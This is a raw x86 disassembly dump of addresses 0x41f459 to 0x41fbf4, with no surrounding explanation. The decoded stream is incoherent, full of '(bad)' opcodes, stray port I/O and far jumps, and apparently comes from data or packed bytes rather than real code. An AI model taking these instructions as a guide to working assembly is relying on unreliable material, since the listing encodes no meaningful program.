  41f459:	popa   
  41f45a:	nop
  41f45b:	adc    ebx,edx
  41f45d:	retf   0x712b
  41f460:	call   0x27a0:0xf6f6d1bb
  41f467:	not    DWORD PTR [edx-0x3755c253]
  41f46d:	push   cs
  41f46e:	aam    0x9
  41f470:	sti    
  41f471:	and    eax,0x9d885a96
  41f476:	lea    ebx,[ecx]
  41f478:	cmp    esp,DWORD PTR [edx+0x2a]
  41f47b:	jle    0x41f441
  41f47d:	cmp    esi,DWORD PTR [ebx-0x10]
  41f480:	xchg   BYTE PTR [eax-0x4c060051],al
  41f486:	or     dh,BYTE PTR [ecx+0x4788100b]
  41f48c:	loop   0x41f468
  41f48e:	shld   DWORD PTR [edi+0x58c9f50f],ebp,0xea
  41f496:	inc    ecx
  41f497:	out    0xb9,eax
  41f499:	lods   eax,DWORD PTR ds:[esi]
  41f49a:	jnp    0x41f475
  41f49c:	mov    dl,0x8f
  41f49e:	jge    0x41f436
  41f4a0:	jmp    0x3db23a45
  41f4a5:	inc    esp
  41f4a6:	jge    0x41f505
  41f4a8:	add    edx,DWORD PTR [edx+0x45]
  41f4ab:	jo     0x41f45d
  41f4ad:	sahf   
  41f4ae:	out    dx,al
  41f4af:	xor    BYTE PTR [ecx+0x64],cl
  41f4b2:	mul    BYTE PTR [ebx-0x7bd6af09]
  41f4b8:	retf   
  41f4b9:	cwde   
  41f4ba:	cld    
  41f4bb:	(bad)  
  41f4bc:	hlt    
  41f4bd:	fiadd  DWORD PTR [ebp-0x80]
  41f4c0:	sub    al,0xc8
  41f4c2:	mov    ds:0xa39a5f76,eax
  41f4c7:	and    BYTE PTR [edi-0x48c1f865],0x7f
  41f4ce:	sar    DWORD PTR [ebp+0x3c98e54b],cl
  41f4d4:	dec    eax
  41f4d5:	fs and eax,0x7d2d8dd9
  41f4db:	mov    WORD PTR [esi],ss
  41f4dd:	adc    dx,WORD PTR [edx]
  41f4e0:	cli    
  41f4e1:	stos   DWORD PTR es:[edi],eax
  41f4e2:	hlt    
  41f4e3:	pop    ebp
  41f4e4:	xlat   BYTE PTR ds:[ebx]
  41f4e5:	pop    ds
  41f4e6:	jb     0x41f50b
  41f4e8:	in     al,dx
  41f4e9:	push   ss
  41f4ea:	xchg   DWORD PTR [edx],esp
  41f4ec:	psrlw  mm6,QWORD PTR [edi*1+0x77de025c]
  41f4f4:	jg     0x41f528
  41f4f6:	icebp  
  41f4f7:	sbb    BYTE PTR [esi+ecx*4],0xb5
  41f4fb:	mov    esp,0x74b7f798
  41f500:	jmp    0x41f54d
  41f502:	xchg   esi,eax
  41f503:	push   eax
  41f504:	fcompp 
  41f506:	jae    0x41f522
  41f508:	push   ds
  41f509:	adc    edi,DWORD PTR [esi-0x57c7ef65]
  41f50f:	cmc    
  41f510:	sbb    al,0x55
  41f512:	jecxz  0x41f590
  41f514:	call   0xe701:0xb872980
  41f51b:	out    dx,al
  41f51c:	daa    
  41f51d:	(bad)  
  41f51e:	fs and al,0xe0
  41f521:	push   0xdd6b2092
  41f526:	jns    0x41f500
  41f528:	push   edx
  41f529:	lea    ecx,[edx]
  41f52b:	or     al,0x57
  41f52d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f52e:	adc    al,0xea
  41f530:	out    0x39,eax
  41f532:	cmp    bl,BYTE PTR [esi+0x357d2637]
  41f538:	ret    0xf612
  41f53b:	fld    DWORD PTR ss:[ebx+0x7fb357bf]
  41f542:	pop    ebx
  41f543:	outs   dx,BYTE PTR ds:[esi]
  41f544:	jmp    0x41f51a
  41f546:	repz mov ch,0xc2
  41f549:	popa   
  41f54a:	into   
  41f54b:	jl     0x41f59d
  41f54d:	push   esi
  41f54e:	inc    eax
  41f54f:	pop    ecx
  41f550:	mov    dl,0xb0
  41f552:	mov    esp,0xb183daf5
  41f557:	not    BYTE PTR [edx-0x7599d70d]
  41f55d:	rcl    BYTE PTR [esi+0x2ab339ed],1
  41f563:	jb     0x41f598
  41f565:	push   edx
  41f566:	ins    BYTE PTR es:[edi],dx
  41f567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f568:	sub    al,0xa6
  41f56a:	nop
  41f56b:	dec    edx
  41f56c:	xchg   edx,eax
  41f56d:	imul   esi
  41f56f:	sub    BYTE PTR [edx+0x43],dl
  41f572:	aaa    
  41f573:	xchg   ebx,eax
  41f574:	aaa    
  41f575:	pop    eax
  41f576:	add    bl,BYTE PTR [esp+edi*8-0x666b30c3]
  41f57d:	mov    ebp,0xb891b239
  41f582:	mov    dl,0xb5
  41f584:	sar    BYTE PTR [edi-0x16],0x9e
  41f588:	mov    ah,0x73
  41f58a:	popa   
  41f58b:	mov    ebp,esp
  41f58d:	imul   edx,DWORD PTR [ecx-0x5923ae47],0xfffffffe
  41f594:	nop
  41f595:	xor    al,BYTE PTR [esi-0x27]
  41f598:	imul   DWORD PTR [edi+ebp*1+0x592dea54]
  41f59f:	cld    
  41f5a0:	sbb    eax,0x9056e4d9
  41f5a5:	mov    WORD PTR [eax-0x27],cs
  41f5a8:	mov    al,ds:0x7e2cd6c1
  41f5ad:	jne    0x41f53c
  41f5af:	sub    ah,bl
  41f5b1:	xor    BYTE PTR [ecx+0x4d56b4e9],0xc3
  41f5b8:	jl     0x41f579
  41f5ba:	mov    bh,0xa7
  41f5bc:	pop    edi
  41f5bd:	mov    ecx,0x950ca17b
  41f5c2:	mov    ds:0x69d957f4,al
  41f5c7:	cmp    DWORD PTR [eax],esi
  41f5c9:	adc    ecx,ebp
  41f5cb:	pop    ebx
  41f5cc:	push   es
  41f5cd:	add    al,ch
  41f5cf:	aaa    
  41f5d0:	call   0xb2929cf4
  41f5d5:	iret   
  41f5d6:	in     eax,0x4d
  41f5d8:	ds aad 0xea
  41f5db:	repz movsx esp,BYTE PTR [esi-0x7e]
  41f5e0:	mov    edx,0x78507ec6
  41f5e5:	out    dx,al
  41f5e6:	sar    cl,1
  41f5e8:	lock arpl si,bx
  41f5eb:	or     BYTE PTR [ebx-0x83ec8aa],al
  41f5f1:	add    DWORD PTR [eax],0xffffffc1
  41f5f4:	jmp    0xb980:0x397a9daa
  41f5fb:	dec    ebx
  41f5fc:	and    al,0x7b
  41f5fe:	xchg   edi,eax
  41f5ff:	in     eax,0x89
  41f601:	mov    ch,0x2f
  41f603:	mov    esi,0xa64ae474
  41f608:	mov    esi,0xf93adb9b
  41f60d:	push   esi
  41f60e:	cmp    BYTE PTR [ecx],0x95
  41f611:	int3   
  41f612:	ret    
  41f613:	or     ebp,esp
  41f615:	cmp    dh,BYTE PTR [eax]
  41f617:	daa    
  41f618:	mov    ecx,0x44de904b
  41f61d:	popa   
  41f61e:	pop    edx
  41f61f:	jg     0x41f676
  41f621:	mov    edi,0x5aeeddc4
  41f626:	in     eax,0xec
  41f628:	add    ecx,eax
  41f62a:	mov    ch,0xcc
  41f62c:	pop    es
  41f62d:	pop    ebx
  41f62e:	cwde   
  41f62f:	pop    edi
  41f630:	jne    0x41f667
  41f632:	popf   
  41f633:	push   ebx
  41f634:	sbb    eax,0x65076ec5
  41f639:	xchg   ebx,eax
  41f63a:	sub    al,0xe4
  41f63c:	fist   DWORD PTR [eax+0x72]
  41f63f:	retf   0x76de
  41f642:	fwait
  41f643:	sbb    ebx,DWORD PTR [ebp+0x53]
  41f646:	les    ecx,FWORD PTR [ecx+edi*2+0xcde79e3]
  41f64d:	cmc    
  41f64e:	mov    ebx,0x879a1b52
  41f653:	call   DWORD PTR fs:[ecx+0x53d1ffe5]
  41f65a:	stos   DWORD PTR es:[edi],eax
  41f65b:	and    al,0x65
  41f65d:	mov    bh,0x32
  41f65f:	cmp    DWORD PTR [edi+0x5337a830],ebp
  41f665:	xchg   esp,eax
  41f666:	jmp    0x41f6dc
  41f668:	je     0x41f69a
  41f66a:	std    
  41f66b:	mov    ds:0xf30cd5e9,eax
  41f670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f671:	dec    edx
  41f672:	push   ebp
  41f673:	jnp    0x41f68e
  41f675:	imul   esi,DWORD PTR [ebx+edi*4],0x7d
  41f679:	inc    ebx
  41f67a:	dec    esp
  41f67b:	push   0x45
  41f67d:	mov    bl,BYTE PTR [edx]
  41f67f:	lods   eax,DWORD PTR ds:[esi]
  41f680:	dec    ebp
  41f681:	push   esp
  41f682:	jg     0x41f69f
  41f684:	dec    ecx
  41f685:	pop    ebx
  41f686:	mov    esp,0xa325f195
  41f68b:	mov    ecx,0xc5d59ab7
  41f690:	je     0x41f66a
  41f692:	fiadd  DWORD PTR ds:0xd288e97a
  41f698:	mov    eax,ds:0x2fd722e0
  41f69d:	and    BYTE PTR ds:[edi+eiz*1+0x66aafa48],0x83
  41f6a6:	fwait
  41f6a7:	dec    ebp
  41f6a8:	ins    DWORD PTR es:[edi],dx
  41f6a9:	xchg   esi,eax
  41f6aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6ab:	adc    ebx,DWORD PTR [edi+ecx*2]
  41f6ae:	(bad)
  41f6b1:	lea    eax,[edi-0x59c0e696]
  41f6b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6b8:	mov    ah,0xa8
  41f6ba:	cmp    ebp,DWORD PTR [edx-0x48]
  41f6bd:	dec    eax
  41f6be:	lock call FWORD PTR [ebx+0x1e7a5736]
  41f6c5:	call   0x5839837b
  41f6ca:	jecxz  0x41f717
  41f6cc:	out    0x8b,eax
  41f6ce:	jecxz  0x41f693
  41f6d0:	(bad)  
  41f6d1:	(bad)  
  41f6d2:	loope  0x41f69b
  41f6d4:	xchg   ecx,eax
  41f6d5:	sbb    eax,DWORD PTR [edx+0x71b65b51]
  41f6db:	lods   eax,DWORD PTR ds:[esi]
  41f6dc:	call   0x6e12:0x749b8b6f
  41f6e3:	xor    DWORD PTR [esi],ebx
  41f6e5:	xchg   BYTE PTR ds:0x742b1eea,ch
  41f6eb:	cmp    edi,DWORD PTR [edi-0x3647d131]
  41f6f1:	scas   eax,DWORD PTR es:[edi]
  41f6f2:	adc    BYTE PTR [ebx-0x6bd2b9b8],ch
  41f6f8:	jp     0x41f6ef
  41f6fa:	mov    ebx,0x7d5d2bc6
  41f6ff:	mov    ss,edi
  41f701:	dec    esi
  41f702:	and    ah,0x7
  41f705:	pushf  
  41f706:	sub    esi,DWORD PTR [esi+eiz*2-0x7d]
  41f70a:	pop    edx
  41f70b:	retf   
  41f70c:	test   DWORD PTR ds:0xb8c9b364,0x7bdcc507
  41f716:	xor    BYTE PTR [edx],al
  41f718:	pushf  
  41f719:	dec    esp
  41f71a:	sbb    ecx,0xd6014913
  41f720:	fild   DWORD PTR [esp+edx*8+0x523d4bc1]
  41f727:	inc    ebx
  41f728:	and    bl,BYTE PTR [esp+esi*4]
  41f72b:	sub    esp,DWORD PTR [edi-0x4c]
  41f72e:	jnp    0x41f7ac
  41f730:	neg    bh
  41f732:	ds pop ds
  41f734:	sub    eax,0xa7d1ba5d
  41f739:	xchg   edx,eax
  41f73a:	add    al,0xa0
  41f73c:	pop    ss
  41f73d:	xchg   edi,eax
  41f73e:	out    0x6c,eax
  41f740:	sub    BYTE PTR [esi+0x55],dh
  41f743:	jge    0x41f708
  41f745:	lahf   
  41f746:	scas   eax,DWORD PTR es:[edi]
  41f747:	cli    
  41f748:	mov    WORD PTR [esi],?
  41f74a:	push   ss
  41f74b:	mov    ah,0xb7
  41f74d:	lock sbb esi,ebx
  41f750:	and    BYTE PTR [ebp+0x37],al
  41f753:	(bad)  [ecx+ecx*1+0x1aface22]
  41f75a:	sub    BYTE PTR [ecx+edx*2+0x79c80c63],bl
  41f761:	mov    ds:0x7aba5fce,al
  41f766:	mov    edi,0x4c056ed5
  41f76b:	inc    esp
  41f76c:	mov    BYTE PTR [ecx+0x20abb272],0x65
  41f773:	mov    ebx,0x53c75601
  41f778:	sbb    BYTE PTR ss:0x562d832f,ah
  41f77f:	sub    cl,BYTE PTR [edi+0x5]
  41f782:	pop    edx
  41f783:	and    eax,0xba7429b3
  41f788:	jmp    0x41f7c8
  41f78a:	jns    0x41f71f
  41f78c:	loopne 0x41f7df
  41f78e:	sub    BYTE PTR [eax-0x26],0x18
  41f792:	xchg   ecx,eax
  41f793:	cdq    
  41f794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f796:	add    edx,ecx
  41f798:	sbb    al,0x1f
  41f79a:	icebp  
  41f79b:	cmp    esp,ecx
  41f79d:	and    BYTE PTR [ebx-0x6643c3d1],0xd0
  41f7a4:	push   cs
  41f7a5:	push   0xd1b8daee
  41f7aa:	cmp    BYTE PTR [ebp-0x1732b1e2],ah
  41f7b0:	clc    
  41f7b1:	icebp  
  41f7b2:	test   eax,0x66da6c8d
  41f7b7:	rcl    BYTE PTR [esi-0x7eedf46d],1
  41f7bd:	hlt    
  41f7be:	test   DWORD PTR [edx-0x6e],0x5fdf831f
  41f7c5:	jge    0x41f7b4
  41f7c7:	jmp    0x3e48587d
  41f7cc:	cmp    eax,0x80ff356c
  41f7d1:	mov    eax,0x42808094
  41f7d6:	das    
  41f7d7:	adc    bl,bh
  41f7d9:	fwait
  41f7da:	out    dx,eax
  41f7db:	mov    cl,0x68
  41f7dd:	neg    DWORD PTR [ebx+0x2679bf39]
  41f7e3:	inc    edi
  41f7e4:	adc    BYTE PTR [ecx-0x41],cl
  41f7e7:	inc    edx
  41f7e8:	cwde   
  41f7e9:	scas   eax,DWORD PTR es:[edi]
  41f7ea:	sbb    al,0xb2
  41f7ec:	inc    edx
  41f7ed:	pop    ds
  41f7ee:	dec    edx
  41f7ef:	add    al,0x73
  41f7f1:	mov    esi,0x2ee9f3d3
  41f7f6:	mov    ecx,0xc770ea56
  41f7fb:	adc    DWORD PTR [ebp+0x73061283],edx
  41f801:	int3   
  41f802:	imul   ecx,DWORD PTR fs:[eax-0x73429426],0x71e47e67
  41f80d:	cmp    DWORD PTR [edi-0xbb69f6c],0x11
  41f814:	enter  0x670,0xc4
  41f818:	mov    al,0xf4
  41f81a:	enter  0x7ac9,0x31
  41f81e:	dec    ecx
  41f81f:	in     eax,0xb6
  41f821:	adc    bh,BYTE PTR [esi+ebx*1-0x40]
  41f825:	bound  esp,QWORD PTR [eax-0x4c]
  41f828:	mov    ch,0x72
  41f82a:	add    DWORD PTR [edx+esi*8],0xaffcae27
  41f831:	xchg   esi,eax
  41f832:	rol    ebx,0x60
  41f835:	call   0xa078:0x1edeed73
  41f83c:	sub    DWORD PTR [edi],esp
  41f83e:	int    0x4
  41f840:	adc    BYTE PTR [edx-0xd7724f6],0xa4
  41f847:	pop    ebx
  41f848:	test   DWORD PTR [ebx+0x35c91313],ecx
  41f84e:	out    0x23,al
  41f850:	and    BYTE PTR [ebp+0x10],dh
  41f853:	imul   ebx,esp,0x270eea4
  41f859:	xor    al,0x75
  41f85b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f85c:	push   ebx
  41f85d:	jecxz  0x41f853
  41f85f:	mov    ds:0xf8f6de4e,eax
  41f864:	scas   al,BYTE PTR es:[edi]
  41f865:	cmp    esi,DWORD PTR [ecx+ebp*1]
  41f868:	aad    0x40
  41f86a:	jge    0x41f896
  41f86c:	push   0x30a7388f
  41f871:	out    0x64,al
  41f873:	mov    DWORD PTR ds:0x406b867f,esp
  41f879:	jns    0x41f8a3
  41f87b:	mov    bl,0xa0
  41f87d:	sti    
  41f87e:	iret   
  41f87f:	lods   eax,DWORD PTR ds:[esi]
  41f880:	push   es
  41f881:	icebp  
  41f882:	arpl   di,dx
  41f884:	mov    ch,0xd5
  41f886:	cli    
  41f887:	mov    ah,0x52
  41f889:	or     esi,DWORD PTR [ebp+0x7f443388]
  41f88f:	pop    eax
  41f890:	push   esp
  41f891:	fistp  WORD PTR [ebp+0x61fbe477]
  41f897:	push   es
  41f898:	jl     0x41f8a4
  41f89a:	mov    edi,DWORD PTR [edx-0x74]
  41f89d:	inc    esi
  41f89e:	(bad)  
  41f89f:	aad    0xa4
  41f8a1:	std    
  41f8a2:	out    0x59,eax
  41f8a4:	mov    ch,0x8c
  41f8a6:	mov    edx,0x2d21ae02
  41f8ab:	add    DWORD PTR [ecx],ebp
  41f8ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8ae:	xor    al,0x25
  41f8b0:	int3   
  41f8b1:	cwde   
  41f8b2:	pop    esp
  41f8b3:	xchg   dl,bh
  41f8b5:	push   0x381df6a9
  41f8ba:	xchg   eax,ecx
  41f8bc:	mov    ds:0x7b37f362,eax
  41f8c1:	retf   0x39c1
  41f8c4:	add    dl,BYTE PTR [eax]
  41f8c6:	jae    0x41f8f8
  41f8c8:	es dec edx
  41f8ca:	pop    ebp
  41f8cb:	jae    0x41f913
  41f8cd:	jle    0x41f8b5
  41f8cf:	adc    al,0xd6
  41f8d1:	add    bh,BYTE PTR [esi+0x60]
  41f8d4:	das    
  41f8d5:	sub    ecx,esi
  41f8d7:	inc    esp
  41f8d8:	test   al,0xe1
  41f8da:	lock push cs
  41f8dc:	jg     0x41f942
  41f8de:	lds    esp,FWORD PTR [edx+esi*8]
  41f8e1:	pushf  
  41f8e2:	inc    edx
  41f8e3:	arpl   WORD PTR [esi-0x42],dx
  41f8e6:	mov    bl,0x95
  41f8e8:	mov    ebx,0xcf869d3
  41f8ed:	repnz fs cmp al,0x72
  41f8f1:	mov    bh,0xe
  41f8f3:	jmp    0xab5:0x8dadf4b0
  41f8fa:	dec    esi
  41f8fb:	popa   
  41f8fc:	dec    ebx
  41f8fd:	push   ds
  41f8fe:	shl    BYTE PTR [esi+0x6022d519],1
  41f904:	aad    0x1c
  41f906:	(bad)  
  41f907:	sub    DWORD PTR [edi+ebx*2-0x43],ebx
  41f90b:	leave  
  41f90c:	cmc    
  41f90d:	(bad)  
  41f90e:	sub    bh,ah
  41f910:	adc    al,0x6b
  41f912:	jo     0x41f958
  41f914:	gs xor al,0xb3
  41f917:	mov    esp,0x1dddb2ea
  41f91c:	(bad)  
  41f91d:	mov    al,BYTE PTR [ebx+esi*8-0x2e]
  41f921:	cwde   
  41f922:	int    0xab
  41f924:	push   DWORD PTR [ebx]
  41f926:	enter  0x570e,0x5b
  41f92a:	xor    BYTE PTR [ebx-0x44],0xbb
  41f92e:	leave  
  41f92f:	pop    ds
  41f930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f931:	shl    eax,1
  41f933:	jmp    0x5faf:0x6b6f60f9
  41f93a:	cli    
  41f93b:	leave  
  41f93c:	pop    DWORD PTR [edi]
  41f93e:	fwait
  41f93f:	lock lds edi,FWORD PTR [eax]
  41f942:	or     esp,DWORD PTR [esi-0x4592df23]
  41f948:	aad    0x6
  41f94a:	cdq    
  41f94b:	in     al,0xe4
  41f94d:	cmp    eax,0x926f44a4
  41f952:	test   al,0x6a
  41f954:	mov    bl,0xd8
  41f956:	push   edi
  41f957:	mov    dh,0x85
  41f959:	or     eax,0x3319ef40
  41f95e:	lea    ebx,[edi+eax*2-0x684acf03]
  41f965:	retf   0x70c
  41f968:	stc    
  41f969:	add    al,0x40
  41f96b:	mov    eax,ds:0xf1d9d20c
  41f970:	push   esp
  41f971:	and    dl,BYTE PTR [eax-0x2a]
  41f974:	jns    0x41f973
  41f976:	dec    ebp
  41f977:	arpl   WORD PTR [edx],cx
  41f979:	dec    eax
  41f97a:	iret   
  41f97b:	into   
  41f97c:	dec    ecx
  41f97d:	xchg   ecx,eax
  41f97e:	mov    DWORD PTR [ebx],ebx
  41f980:	cmp    ch,BYTE PTR [ebp-0x5c]
  41f983:	fcmovbe st,st(4)
  41f985:	repnz adc DWORD PTR ds:0xef1542ed,0xbeae24ec
  41f990:	mov    ds:0xb01b66a8,eax
  41f995:	sbb    eax,0x207ee854
  41f99a:	xlat   BYTE PTR ds:[ebx]
  41f99b:	call   FWORD PTR [edx-0x44]
  41f99e:	xor    ecx,edi
  41f9a0:	rep ins BYTE PTR es:[edi],dx
  41f9a2:	jp     0x41fa08
  41f9a4:	(bad)  
  41f9a5:	mov    al,ds:0xc04774e4
  41f9aa:	cld    
  41f9ab:	neg    DWORD PTR [ebp-0x6f]
  41f9ae:	loop   0x41f93b
  41f9b0:	lds    esi,FWORD PTR [ebp-0x7f]
  41f9b3:	ins    BYTE PTR es:[edi],dx
  41f9b4:	lock leave 
  41f9b6:	hlt    
  41f9b7:	sub    ecx,DWORD PTR [edx-0x6ec9c963]
  41f9bd:	ficom  WORD PTR [edi+0x79]
  41f9c0:	sbb    BYTE PTR [ebx],ch
  41f9c2:	call   0x7444088c
  41f9c7:	or     ebp,DWORD PTR [edx]
  41f9c9:	loopne 0x41f9f9
  41f9cb:	xor    al,0xd8
  41f9cd:	test   eax,eax
  41f9cf:	mov    bl,BYTE PTR [esi-0x13]
  41f9d2:	out    0xaa,al
  41f9d4:	in     al,0x6b
  41f9d6:	rol    edi,0x1e
  41f9d9:	push   0x48
  41f9db:	inc    esp
  41f9dc:	cmp    bl,0x30
  41f9df:	bound  edi,QWORD PTR [ebx+0x22c5b986]
  41f9e5:	ffree  st(2)
  41f9e7:	bound  edx,QWORD PTR [ebp-0x3a4fb18e]
  41f9ed:	dec    edx
  41f9ee:	inc    edx
  41f9ef:	ins    DWORD PTR es:[edi],dx
  41f9f0:	sub    al,0x61
  41f9f2:	mov    BYTE PTR [edx+0x6e599f5b],bl
  41f9f8:	daa    
  41f9f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9fa:	and    dh,BYTE PTR [ecx]
  41f9fc:	adc    cl,ch
  41f9fe:	dec    ecx
  41f9ff:	(bad)  
  41fa00:	push   cs
  41fa01:	jl     0x41fa47
  41fa03:	in     eax,0x24
  41fa05:	push   esi
  41fa06:	adc    eax,0x7d561a12
  41fa0b:	pushf  
  41fa0c:	push   esi
  41fa0d:	or     DWORD PTR [ecx+0x2c],0xc5304079
  41fa14:	lds    ecx,FWORD PTR [edx+0x6]
  41fa17:	xor    eax,0x84ed0063
  41fa1c:	or     al,0xdf
  41fa1e:	hlt    
  41fa1f:	xchg   edx,eax
  41fa20:	mov    ecx,0x7b146381
  41fa25:	mov    ds:0xbf1cfdf8,al
  41fa2a:	outs   dx,DWORD PTR ds:[esi]
  41fa2b:	dec    esp
  41fa2c:	mov    BYTE PTR [edx-0x5124b9e3],dh
  41fa32:	or     al,0xab
  41fa34:	out    dx,eax
  41fa35:	cld    
  41fa36:	leave  
  41fa37:	lods   al,BYTE PTR ds:[esi]
  41fa38:	dec    eax
  41fa39:	retf   
  41fa3a:	hlt    
  41fa3b:	mov    esp,0x6a0d373c
  41fa40:	cmp    bl,bh
  41fa42:	xchg   esi,eax
  41fa43:	aad    0xff
  41fa45:	sbb    dh,BYTE PTR [ecx+0x9]
  41fa48:	popa   
  41fa49:	push   ebp
  41fa4a:	ins    BYTE PTR es:[edi],dx
  41fa4b:	data16 sahf 
  41fa4d:	ret    
  41fa4e:	inc    esi
  41fa4f:	xchg   BYTE PTR [ebx+0x25],cl
  41fa52:	pop    ecx
  41fa53:	mov    esi,0xa390998e
  41fa58:	cmc    
  41fa59:	test   eax,0x945e03d4
  41fa5e:	cmp    ecx,DWORD PTR [ebp-0x758647f2]
  41fa64:	mov    dl,0x31
  41fa66:	inc    ecx
  41fa67:	out    0xf6,al
  41fa69:	mov    WORD PTR [ebx-0x7aeeacf],es
  41fa6f:	scas   al,BYTE PTR es:[edi]
  41fa70:	aas    
  41fa71:	push   esi
  41fa72:	stc    
  41fa73:	sti    
  41fa74:	jnp    0x41fad6
  41fa76:	call   0xbd39:0x3d27c374
  41fa7d:	fadd   DWORD PTR [eax+0x78]
  41fa80:	retf   
  41fa81:	aas    
  41fa82:	in     eax,dx
  41fa83:	ss dec esp
  41fa85:	sub    edi,edi
  41fa87:	jbe    0x41faa4
  41fa89:	inc    esp
  41fa8a:	push   edx
  41fa8b:	or     DWORD PTR ds:0x47d9dd89,edi
  41fa91:	xor    ecx,DWORD PTR [ebp+0x267cf95a]
  41fa97:	inc    ebx
  41fa98:	jno    0x41fab4
  41fa9a:	add    BYTE PTR [ecx-0x47d5145c],ah
  41faa0:	mov    ds:0x61953e4a,eax
  41faa5:	add    eax,0xaf6f8598
  41faaa:	cwde   
  41faab:	rol    DWORD PTR [esi+0x3b],1
  41faae:	xor    DWORD PTR [ebx],esi
  41fab0:	push   0xffffff9c
  41fab2:	cmp    eax,0x4372fb6e
  41fab7:	jecxz  0x41fa99
  41fab9:	fcmovnbe st,st(3)
  41fabb:	inc    esp
  41fabc:	push   edi
  41fabd:	(bad)
  41fac0:	pushf  
  41fac1:	jl     0x41fa48
  41fac3:	loop   0x41fb30
  41fac5:	lds    ecx,FWORD PTR [esi]
  41fac7:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41fac9:	and    BYTE PTR [eiz*1-0x592322cc],al
  41fad0:	fst    DWORD PTR [ecx+ebx*1-0x5f]
  41fad4:	cmp    BYTE PTR [ebx],ch
  41fad6:	or     bl,BYTE PTR [eax-0x4651a007]
  41fadc:	push   0x87f66a0a
  41fae1:	or     DWORD PTR [edx+0x71],eax
  41fae4:	fs lahf 
  41fae6:	stos   DWORD PTR es:[edi],eax
  41fae7:	mul    DWORD PTR [eax+edx*2]
  41faea:	lahf   
  41faeb:	inc    ebp
  41faec:	out    0x41,eax
  41faee:	loop   0x41fa77
  41faf0:	mov    cl,ah
  41faf2:	jl     0x41fb2f
  41faf4:	mov    WORD PTR [edx],?
  41faf6:	stc    
  41faf7:	bound  edx,QWORD PTR [ebx-0x7b]
  41fafa:	fcomp  QWORD PTR [esi-0x1e]
  41fafd:	ja     0x41fb3d
  41faff:	or     ebp,DWORD PTR [ebx+0x7]
  41fb02:	fwait
  41fb03:	loopne 0x41fab9
  41fb05:	or     al,0xd0
  41fb07:	jae    0x41fb7a
  41fb09:	(bad)  
  41fb0a:	sar    DWORD PTR [eax-0xc6a966],1
  41fb10:	enter  0x1af3,0xe3
  41fb14:	push   ss
  41fb15:	push   0x1f
  41fb17:	adc    eax,DWORD PTR [ebx+0x10bec367]
  41fb1d:	pop    esi
  41fb1e:	or     eax,0x975c27a0
  41fb23:	stos   BYTE PTR es:[edi],al
  41fb24:	dec    edx
  41fb25:	mov    eax,0x77b1ec41
  41fb2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb2b:	imul   esp,DWORD PTR [ecx],0x477d057
  41fb31:	ret    
  41fb32:	xor    al,0x3d
  41fb34:	idiv   DWORD PTR [ebx-0x5]
  41fb37:	sbb    al,0x91
  41fb39:	mov    al,ds:0x54beb823
  41fb3e:	jno    0x41fbbf
  41fb40:	ds cld 
  41fb42:	imul   esi,DWORD PTR [ebx+0x44],0xba786fab
  41fb49:	hlt    
  41fb4a:	mov    eax,ds:0x5d0bf4bd
  41fb4f:	cmp    cl,cl
  41fb51:	or     al,0xb4
  41fb53:	inc    esi
  41fb54:	dec    ebp
  41fb55:	leave  
  41fb56:	cmc    
  41fb57:	push   esi
  41fb58:	loop   0x41fb7c
  41fb5a:	in     eax,0x69
  41fb5c:	dec    eax
  41fb5d:	jae    0x41fb24
  41fb5f:	pop    ebx
  41fb60:	call   0xbbb45595
  41fb65:	adc    DWORD PTR [ebp-0x3c],esi
  41fb68:	push   edi
  41fb69:	pop    esi
  41fb6a:	cli    
  41fb6b:	xchg   esp,eax
  41fb6c:	xor    ebp,DWORD PTR ds:0x5c4f7526
  41fb72:	dec    edi
  41fb73:	mov    dh,0x6b
  41fb75:	repnz (bad) 
  41fb77:	test   al,0xcb
  41fb79:	ins    BYTE PTR es:[edi],dx
  41fb7a:	ss cld 
  41fb7c:	add    eax,0xda313c68
  41fb81:	loopne 0x41fba6
  41fb83:	movq   QWORD PTR [edi],mm4
  41fb86:	shl    BYTE PTR [ebp-0x5b05faad],1
  41fb8c:	inc    ebx
  41fb8d:	push   cs
  41fb8e:	add    ecx,DWORD PTR [ebp-0x6eb51b11]
  41fb94:	or     al,0x1e
  41fb96:	sub    ecx,0x54
  41fb99:	je     0x41fb40
  41fb9b:	sbb    BYTE PTR [edx],bl
  41fb9d:	(bad)  
  41fb9e:	cld    
  41fb9f:	loopne 0x41fbea
  41fba1:	mov    eax,ds:0x99b712fd
  41fba6:	out    dx,al
  41fba7:	test   dh,dh
  41fba9:	xor    DWORD PTR [eax],esi
  41fbab:	add    al,0x66
  41fbae:	dec    ebp
  41fbaf:	xchg   esi,eax
  41fbb0:	mov    al,0x8b
  41fbb2:	rcl    esp,cl
  41fbb4:	mov    ch,0x0
  41fbb6:	dec    esp
  41fbb7:	jecxz  0x41fb6b
  41fbb9:	inc    eax
  41fbba:	cwde   
  41fbbb:	into   
  41fbbc:	jl     0x41fbaa
  41fbbe:	inc    esp
  41fbbf:	jb     0x41fbd7
  41fbc1:	and    ecx,DWORD PTR [edx+0x4b]
  41fbc4:	push   edi
  41fbc5:	int3   
  41fbc6:	jg     0x41fb9f
  41fbc8:	out    dx,eax
  41fbc9:	ret    0x1726
  41fbcc:	out    0xf2,eax
  41fbce:	sbb    esi,DWORD PTR [ebx+0x41]
  41fbd1:	and    dh,BYTE PTR [ebx+0x76]
  41fbd4:	jo     0x41fc3e
  41fbd6:	cmp    edx,DWORD PTR [ebp+edi*4-0x4c]
  41fbda:	repnz inc esp
  41fbdc:	mov    BYTE PTR [edi+edx*8+0x3568a78b],dl
  41fbe3:	adc    DWORD PTR [esi-0x2f],esi
  41fbe6:	cmp    DWORD PTR [edx],0x887e446
  41fbec:	or     dl,BYTE PTR [edx-0x6f1ae3c7]
  41fbf2:	jne    0x41fb9a
  41fbf4:	xlat   BYTE PTR ds:[ebx]
